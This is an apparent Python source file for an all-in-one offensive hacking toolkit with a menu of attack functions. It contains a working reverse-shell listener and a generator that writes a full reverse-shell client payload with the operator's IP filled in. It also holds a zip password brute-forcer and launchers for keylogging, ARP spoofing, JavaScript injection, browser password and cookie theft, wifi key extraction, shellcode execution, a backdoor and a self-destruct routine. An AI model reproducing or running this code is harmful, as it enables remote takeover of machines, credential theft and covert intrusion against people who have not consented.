import os
import socket
SEPARATOR = "<SEPARATOR>"
from tqdm import tqdm
import requests
import platform
import zipfile
from urllib.parse import urlparse, urljoin
import sys
import shutil
import numpy as np
from PIL import Image
from PIL.ExifTags import TAGS
import ipinfo
import subprocess
import dns.resolver
from scapy.all import IP, TCP, send, Ether, DHCP, Raw, sniff, Dot11, Dot11Deauth, RadioTap, ARP, srp, RandShort
from scapy.all import *
from scapy.layers.http import *
import time
from colorama import Fore, init
colorama.init()
from collections import deque
from urllib.parse import urlsplit
from tld import get_fld

username = input(Fore.YELLOW + "Reenter you USERNAME: " + Fore.RESET)
current_directory = os.path.dirname(os.path.abspath(__file__))

def clear_screen():
    if os.name == 'nt':
        os.system('cls')

def leave():
    clear_screen()
    time.sleep(2)
    clear_screen()
    print("Loading...")
    time.sleep(3)
    clear_screen()
    print("Leaving...")
    time.sleep(2)
    clear_screen()
    print("Thanks for using our Services")
    sys.exit(0)



def access(password):
    while True:
        clear_screen()
        if password == "&724St724&":
            print(Fore.GREEN + "Access Granted")
            time.sleep(2)
            clear_screen()
            print("Loading...")
            time.sleep(3)
            clear_screen()
            return True
        else:
            break
    return False


def new_user():
    global filename
    filename = current_directory + "\\names.txt"
    with open(filename, "r") as f:
        names = f.read().splitlines()
    global name2
    name2 = input("Enter a new name: ")
    if name2 in names:
        return False
    else:
        names.append(name2)
        with open(filename, "w") as f:
            for name2 in names:
                f.write(name2 + "\n")
        with open(filename, "r") as f:
            names = f.read().splitlines()
        return True


def check_name(name):
    filename = current_directory + "\\names.txt"
    with open(filename, "r") as f:
        names = f.read().splitlines()
    if name in names:
        return True
    if name not in names:
        return False


def geoip():
    clear_screen()
    try:
        try:
            ip_address = input("Enter IP to scan: ")
            clear_screen()
        except IndexError:
            ip_address = None   
        access_token = input("Enter your access token: ")
        handler = ipinfo.getHandler(access_token)
        details = handler.getDetails(ip_address)
        for key, value in details.all.items():
            print(f"{key}: {value}")
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def dns_enum():
    clear_screen()
    try:
        target_domain = input("Enter the Domain to enumarate: ")
        clear_screen()
        record_types = ["A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]
        resolver = dns.resolver.Resolver()
        for record_type in record_types:
            answers = resolver.resolve(target_domain, record_type)
            print(f"{record_type} records for {target_domain}:")
            for rdata in answers:
                print(f" {rdata}")
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def copier():
    clear_screen()
    try:
        src_file = input("Enter the path to the FILE: ")
        dst_file = input("Enter the path to the Copy-destination: ")
        shutil.copy2(src_file, dst_file)
        time.sleep(2)
        print("Copying...")
        time.sleep(3)
        clear_screen()
        print("Copying Complete")
        time.sleep(3)
        clear_screen()
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def gen_passwd():
    clear_screen()
    try:
        arg1 = "--help"
        arg2 = "--output-file"
        arg3 = "--amount"
        arg4 = "--total-length"
        file_path = current_directory + "\\modules\\program2.py"
        subprocess.call([sys.executable, file_path, arg1], shell=True, bufsize=0)
        arg5 = input("Enter the name of the output file: ")
        arg6 = input("Enter the amount of passwords you want to be generated: ")
        arg7 = input("Enter the length of the passwords: ")
        clear_screen()
        subprocess.call([sys.executable, file_path, arg2, arg5, arg3, arg6, arg4, arg7], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the program!!!")


def mac_changer():
    clear_screen()
    try:
        print("This MAC Address changer only applies to Linux and Windows Systems.")
        if os.name == 'nt':
            arg1 = "--help"
            arg2 = "--random"
            arg3 = "--mac"
            file_path = current_directory + "\\modules\\program4.py"
            subprocess.call([sys.executable, file_path, arg1], shell=True, bufsize=0)
            linux_random = input("Do you want a Random or Custom MAC Address? R/C: ")
            if linux_random == "R":
                clear_screen()
                subprocess.call([sys.executable, file_path, arg2], shell=True, bufsize=0)
            elif linux_random == "C":
                clear_screen()
                mac_addr = input("Enter the MAC Address you want to spoof: ")
                clear_screen()
                subprocess.call([sys.executable, file_path, arg3 , mac_addr], shell=True, bufsize=0)
        else:
            print("This tool is only for Windows")
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def shodan_search():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program6.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def pdf_cracker():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program7.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def zip_cracker():
    clear_screen()
    try:
        wordlist = input("Enter the PATH to the Wordlidt to use: ")
        zip_file = input("Enter the PATH to the Zip File to crack: ")
        zip_file = zipfile.ZipFile(zip_file)
        n_words = len(list(open(wordlist, "rb")))
        print("Total passwords to test:", n_words)
        with open(wordlist, "rb") as wordlist:
            for word in tqdm(wordlist, total=n_words, unit="word"):
                try:
                    zip_file.extractall(pwd=word.strip())
                except:
                    continue
                else:
                    print("[+] Password found:", word.decode().strip())
                    exit(0)
        print("[!] Password not found, try other wordlist.")
    except KeyboardInterrupt:
        print("You exited the Program!!!")
    

def metadata():
    clear_screen()
    try:
        imagename = input("Enter the NAME/PATH of the Image to extract Metadata from: ")
        image = Image.open(imagename)
        info_dict = {
            "Filename": image.filename,
            "Image Size": image.size,
            "Image Height": image.height,
            "Image Width": image.width,
            "Image Format": image.format,
            "Image Mode": image.mode,
            "Image is Animated": getattr(image, "is_animated", False),
            "Frames in Image": getattr(image, "n_frames", 1)
        }
        for label,value in info_dict.items():
            print(f"{label:25}: {value}")
            exifdata = image.getexif()
            for tag_id in exifdata:
                tag = TAGS.get(tag_id, tag_id)
                data = exifdata.get(tag_id)
                if isinstance(data, bytes):
                    data = data.decode()
                print(f"{tag:25}: {data}")
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def remote_commands():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program10.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def to_bin():
    clear_screen()
    try:
        """Convert `data` to binary format as string"""
        data = input("Enter the Data to Encode: ")
        clear_screen()
        if isinstance(data, str):
            print(''.join([ format(ord(i), "08b") for i in data ]))
        elif isinstance(data, bytes):
            print(''.join([ format(i, "08b") for i in data ]))      
        elif isinstance(data, np.ndarray):
            print([ format(i, "08b") for i in data ]) 
        elif isinstance(data, int) or isinstance(data, np.uint8):
            print(format(data, "08b"))
        else:
            raise print(TypeError("Type not supported."))
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def subdomain_list():
    clear_screen()
    try:
        domain = input("Enter the Domain to Scan: ")
        lists = input("Do you want an Advanced or Quick process(A/Q): ")
        file1 = current_directory + "\\Exports\\list2.txt"
        file2 = current_directory + "\\Exports\\list3.txt"
        if lists == "Q":
            if not os.path.exists(file1):
                with open(file1, "w") as f:
                    print("This file does not exist, creating it now...")
            f = open(file1, "r")
            content = f.read()
        elif lists == "A":
            if not os.path.exists(file2):
                with open(file2, "w") as f:
                    print("This file does not exist, creating it now...")
            f = open(file2, "r")
            content = f.read()
        else:
            print("This is not an option")
        subdomains = content.splitlines()
        discovered_subdomains = []
        for subdomain in subdomains:
            url = f"http://{subdomain}.{domain}"
            try:
                requests.get(url)
            except requests.ConnectionError:
                pass
            else:
                print("[+] Discovered subdomain:", url)
                discovered_subdomains.append(url)
        with open("discovered_subdomains.txt", "w") as f:
            for subdomain in discovered_subdomains:
                print(subdomain, file=f)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def web_crawl():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program11.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def crypting():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program12.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def server_shell():
    clear_screen()
    try:
        print("The Reverse shell will run on PORT 9999")
        SERVER_HOST = "0.0.0.0"
        SERVER_PORT = 9999
        BUFFER_SIZE = 1024 * 128
        s = socket.socket()
        s.bind((SERVER_HOST, SERVER_PORT))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        cwd = client_socket.recv(BUFFER_SIZE).decode()
        print("[+] Current working directory:", cwd)
        while True:
            command = input(f"{cwd} $> ")
            if not command.strip():
                continue
            client_socket.send(command.encode())
            if command.lower() == "exit":
                break
            output = client_socket.recv(BUFFER_SIZE).decode()
            print("output:", output)
            results, cwd = output.split(SEPARATOR)
            print(results)
        client_socket.close()
        s.close()
    except KeyboardInterrupt:
        print("You exited the Shell!!!")


def client_shell():
    clear_screen()
    try:
        ip = input("Enter you IP Address: ")
        file_path = current_directory + "\\Exports\\shell.py"
        with open(file_path, 'w') as f:
            f.write('''
import socket
import os
import subprocess
import sys

SERVER_HOST = "''' + ip + '''"
SERVER_PORT = 9999
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close() 
                    ''')
        print("Reverse Shell Client Payload was saved to the Exports directory")
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def http_sniff():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program13.py"
        subprocess.call([sys.executable, file_path, "-i wlan0 --show-raw"], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def network_scan():
    clear_screen()
    try:
        target_ip = input("Enter the Network IP RANGE: ")
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=3, verbose=0)[0]
        clients = []
        for sent, received in result:
            clients.append({'ip': received.psrc, 'mac': received.hwsrc})
        print("Available devices in the network:")
        print("IP" + " "*18+"MAC")
        for client in clients:
            print("{:16}    {}".format(client['ip'], client['mac']))
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def keylogger():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program14.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def port_scanner():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program15.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def arp_spoof():
    clear_screen()
    try:
        arg1 = input("Enter your Target IP Address: ")
        arg2= input("Enter the Gateway IP Address: ")
        arg3 = input("Enter the Interface you want to Spoof: ")
        file_path = current_directory + "\\modules\\program16.py"
        subprocess.call([sys.executable, file_path, arg1, arg2, arg3], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")


def java_inject():
    clear_screen()
    try:
        test = input("Remember that you need a ARP SPOOF connection between you your victim and the gateway \n To be able to inject JAVA SCRIPT \n(Press ENTER to continoue): ")
        subprocess.call(['netsh advfirewall firewall add rule name="Forward Packets" dir=in action=allow protocol=any localip=any remoteip=any edge=yes description="Forward packets to user-mode application"'], shell=True, bufsize=0)
        file_path = current_directory + "\\modules\\program17.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        windows_version = platform.release()
        if windows_version == '10':
            command = 'netsh advfirewall reset'
        elif 'Server' in windows_version:
            command = 'netsh advfirewall reset'
        else:
            command = 'netsh firewall reset'
        subprocess.call([command], shell=True, bufsize=0)
        print("You exited the Program!!!")


def self_destruct():
    clear_screen()
    try:
        print("Self destruct sequence starts in 10 seconds(Press CTL+C to cancel)")
        time.sleep(10)
        print("Self destruct sequence initiated")
        file_path = current_directory + "\\modules\\program18.py"
        file_path2 = current_directory
        subprocess.call([sys.executable, file_path, file_path2], shell=True, bufsize=0)
        subprocess.call([f"del /f {current_directory}"], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("Self destruct sequence cancelled")

def wifi_extract():
    clear_screen()
    try:
        file_path = current_directory + "\\modules\\program19.py"
        subprocess.call([sys.executable, file_path], shell=True, bufsize=0)
    except KeyboardInterrupt:
        print("You exited the Program!!!")

def hash_crack():
    arg1 = "--hash-type"
    arg2 = input("Enter the hash to crack: ")
    arg3 = input("Enter the full path to the worlist of passwords: ")
    arg4 = input("Enter the hash type: ")
    file_path = current_directory + "\\modules\\program20.py"
    subprocess.call([sys.executable, file_path, arg2, arg3, arg1, arg4], shell=True, bufsize=0)

def passwd_extract():
    file_path = current_directory + "\\modules\\program21.py"
    subprocess.call([sys.executable, file_path], shell=True, bufsize=0)

def cookie_extract():
    file_path = current_directory + "\\modules\\program22.py"
    subprocess.call([sys.executable, file_path], shell=True, bufsize=0)

def screenshot():
    file_path = current_directory + "\\modules\\program8.py"
    subprocess.call([sys.executable, file_path], shell=True, bufsize=0)

def shellcode_exe():
    file_path = current_directory + "\\modules\\program9.py"
    subprocess.call([sys.executable, file_path], shell=True, bufsize=0)

def sand_scan():
    file_path = current_directory + "\\modules\\program24.py"
    subprocess.call([sys.executable, file_path], shell=True, bufsize=0)

def backdoor():
    file_path = current_directory + "\\modules\\program23.py"
    subprocess.call([sys.executable, file_path], shell=True, bufsize=0)